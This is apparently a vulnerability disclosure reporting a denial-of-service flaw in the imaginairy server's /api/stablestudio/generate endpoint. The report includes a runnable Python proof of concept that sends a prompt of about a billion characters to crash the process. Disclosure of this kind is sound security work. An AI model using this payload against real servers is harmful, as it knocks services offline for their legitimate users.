Denial of Service in brycedrennan/imaginairy

Valid

Reported on Oct 20th 2024

Setup

pip install imaginairy and aimg server

Description

The /api/stablestudio/generate endpoint is vulnerable to a Denial of Service (DoS) attack, triggered by sending an invalid request. This causes the system to abruptly terminate the process, with the terminal outputting KILLED. This issue can lead to the unavailability of the server, affecting all users by disrupting the server's functionality.

Video_POC

https://drive.google.com/file/d/1IVWMWhRxbZcvxqPiHEs7dhpoQf--v09r/view?usp=sharing

Proof of Concept

  • Run following python script.
import requests

# Number of extra characters to be added to the prompt text
num = 500000000

# Large text by repeating the character 'A' num times
large_text = '/#' * num

# URL for the new request
url = "http://localhost:8000/api/stablestudio/generate"

# JSON payload with the large text in the prompt
json_payload = {
    "input": {
        "sampler": {
            "id": "ddim",
            "name": "ddim"
        },
        "height": 512,
        "width": 512,
        "model": "SD-1.5",
        "seed": 0,
        "steps": 50,
        "style": "enhance",
        "prompts": [
            {
                "text": large_text,
                "weight": 1
            }
        ]
    },
    "count": 1
}

# Headers
headers = {
    "Content-Type": "application/json"
}

# Make the POST request and disable SSL verification
response = requests.post(url, headers=headers, json=json_payload, verify=False)

Impact

Service Disruption: When an attacker sends an invalid request, the complete server process terminates, printing KILLED in the terminal. This immediately renders the server unavailable, preventing legitimate users from accessing or using the service. Depending on the scale of the attack, this can bring down the entire application or severely degrade its performance, affecting all users.

Business Impact: For businesses relying on this API endpoint, especially in critical workflows or revenue-generating services, prolonged outages could result in financial losses, decreased user trust, and potential regulatory issues if uptime requirements are mandated.
